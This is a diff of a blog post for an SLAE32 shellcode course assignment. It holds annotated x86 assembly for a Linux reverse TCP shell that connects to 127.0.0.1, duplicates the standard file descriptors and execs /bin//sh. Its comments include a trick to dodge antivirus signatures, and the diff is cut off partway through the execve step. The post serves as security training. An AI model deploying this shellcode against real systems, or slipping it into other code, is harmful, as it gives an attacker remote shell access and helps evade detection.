@@ -3,24 +3,27 @@ layout: post
 title: "SLAE32 Assignment 2 extramile - revshell to 127.0.0.1"
 excerpt: "a little extramile for assignment 2: i'm using a remote address that contain null bytes"
 ---
-    ; name     : tcprevshell
+    ; name       : tcprevshell
     ; author     : Sandro "guly" Zaccarini SLAE-1037
-    ; purpose    : the program will create a new connection to a given ip/port and present a shell to it
-    ;            as extramile, i'm using an address with known nullbytes: 127.0.0.1
-    ;            this code has been written for SLAE32 assignment 2
-    ; references : https://syscalls.kernelgrok.com/ , /usr/include/linux/net.h , man socketcall
+    ; purpose    : the program will create a new connection to given ip/port and present
+    ;              a shell to it.
+    ;              as extramile, i'm using an address with known nullbytes: 127.0.0.1
+    ;              this code has been written for SLAE32 assignment 2
+    ; references : https://syscalls.kernelgrok.com/ , /usr/include/linux/net.h ,
+    ;              man socketcall
     ; license    : CC-BY-NC-SA
     ;
     ; high level flow:
     ; socket -> connect -> dup fd -> spawn /bin//sh
     ;
-    ; i'll use different function name to keep it more readable. mostly, function are never called and are used just as "anchor for the human eyes"
+    ; i'll use different function name to keep it more readable. mostly, function are
+    ; never called and are used just as "anchor for the human eyes"
     
     global _start
     
     section .text
     
-    ; dummy function used to break easily on gdb while debugging, just rets without touching anything
+    ; dummy function used to break easily on gdb while debugging, just rets 
     ; i used to place a call trap and recompile, while having a "b trap" on ~/.gdbinit
     trap:
     ret
@@ -32,25 +35,30 @@ excerpt: "a little extramile for assignment 2: i'm using a remote address that c
     ret
     
     socketcall2eax:
-    ; place syscall code for socketcall in eax, which is 0x66, no need to zero because i use mov.
-    ; i'm using add to avoid hardcoded 0x66 call, which could be trapped by some AV, when 0x33 is the call acct and looks harmless to me
+    ; syscall code for socketcall in eax, which is 0x66, no need to zero because of mov
+    ; i'm using add to avoid hardcoded 0x66 call, which could be trapped by some AV, when
+    ; 0x33 is the call acct and looks harmless to me
     mov al,0x33
     add al,0x33
     ret
     
     ; main code starts here
     _start:
-    ; start by zeroing eax,ebx. not really needed because registers are clean, but better safe than sorry
+    ; start by zeroing eax,ebx. not really needed because registers are clean, but better
+    ; safe than sorry
     call zero
     
     createsocket:
-    ; ----------------------------------------------------------------------------------------
+    ; -----------------------------------------------------------------------------------
     ; purpose     : create a socket
     ; references  : man socket
     ; description :
-    ; socketcall is the syscall used to work with socket. i'm going to use this syscall to create and connect
-    ; the very first thing i have to do, is to create the socket itself. by reading references, i see that she needs 3 registers:
-    ; eax => syscall id 0x66 for socketcall, that will be the same for every socketcall call of course and that's why i created a function on top
+    ; socketcall is the syscall used to work with socket. i'm going to use this to create
+    ; and connect
+    ; the first thing i do is to create the socket itself. by reading references, i see
+    ; that she needs 3 registers:
+    ; eax => syscall id 0x66 for socketcall, that will be the same for every socketcall
+    ;        call of course and that's why i created a function on top
     ; ebx => socket call id, that is 0x1 for socket creation
     ; ecx => pointer to socket args
     ;
@@ -73,17 +81,19 @@ excerpt: "a little extramile for assignment 2: i'm using a remote address that c
     ; prepare eax to hold the socketcall value as discussed before
     call socketcall2eax
     
-    ; because ebx is 0, i can just inc to have it to 1 for socketcall to call socket (pun intended :) )
+    ; because ebx is 0, i can just inc to have it to 1 for socketcall to call socket
+    ; (pun intended :) )
     inc ebx
     
     ; do the call and create socket
     int 0x80
     
-    ; because syscall rets to eax, if everything's good, eax will hold socket file descriptor: save it to esi to have it safe for the whole run
+    ; because syscall rets to eax, if everything's good, eax will hold socket fd: save it
+    ; to esi to have it safe for the whole run
     mov esi,eax
     
     connect:
-    ; ----------------------------------------------------------------------------------------
+    ; -----------------------------------------------------------------------------------
     ; purpose     : connect to raddr:rport
     ; references  : man connect , man 7 ip
     ; description :
@@ -106,9 +116,10 @@ excerpt: "a little extramile for assignment 2: i'm using a remote address that c
     
     ; push arg in reverse and move the pointer to ecx
     ; prepare stack pointer to addr struct defined in man 7 ip
-    ; as exercise, i'm going to use 127.0.0.1 as remote address, because it contains null bytes
+    ; as exercise i use 127.0.0.1 as remote address, because it contains null bytes
     ; hex value of 127.0.0.1 is 0x0100007f
-    ; pushing 0x00000000 to esp by using a known null register. i've also could used sub esp,0x8 because i have enough room
+    ; pushing 0x00000000 to esp by using a known null register. i've also could used
+    ; sub esp,0x8 because i have enough room
     push eax
     mov byte [esp], 0x7f
     ; now esp is: 0x0000007f
@@ -142,7 +153,7 @@ excerpt: "a little extramile for assignment 2: i'm using a remote address that c
     int 0x80
     
     dupfd:
-    ; ----------------------------------------------------------------------------------------
+    ; -----------------------------------------------------------------------------------
     ; purpose     : create fd used by /bin//sh
     ; references  : man dup2
     ; description : every shell has three file descriptor: STDIN(0), STDOUT(1), STDERR(2)
@@ -151,7 +162,8 @@ excerpt: "a little extramile for assignment 2: i'm using a remote address that c
     ; ebx => clientid
     ; ecx => newfd id, said file descriptor
     ;
-    ; i'm going to create them by looping using ecx, to save some instruction. ecx will start at 2, then is dec and fd is created.
+    ; i'm going to create them by looping using ecx, to save some instruction. ecx will
+    ; start at 2, then is dec and fd is created.
     ; as soon as ecx is 0, the loop ends
     
     
@@ -177,17 +189,18 @@ excerpt: "a little extramile for assignment 2: i'm using a remote address that c
     jnz dup2
     
     spawnshell:
-    ; ----------------------------------------------------------------------------------------
+    ; -----------------------------------------------------------------------------------
     ; purpose     : spawn /bin//sh
     ; references  : man execve
-    ; description : put /bin//sh on the stack, aligned to 8 bytes to prevent 0x00 in the shellcode itself
-    ; and null terminating it by pushing a zeroed register at first
+    ; description : put /bin//sh on the stack, aligned to 8 bytes to prevent 0x00 in the
+    ;               shellcode itself and null terminating it by pushing zero
     ; eax => execve call, 0xB
     ; ebx => pointer to executed string, which will be /bin//sh null terminated
     ; ecx => pointer to args to executed command, that could be 0x0
     ; edx => pointer to environment, which could be 0x0
     ;
-    ; i need to push a null byte to terminate the string, easiest way is to zero a reg and push it but i know ecx is 0x0 so i can save one op
+    ; i need to push a null byte to terminate the string, easiest way is to zero a reg
+    ; and push it but i know ecx is 0x0 so i can save one op
     push ecx
     push 0x68732f2f
     push 0x6e69622f
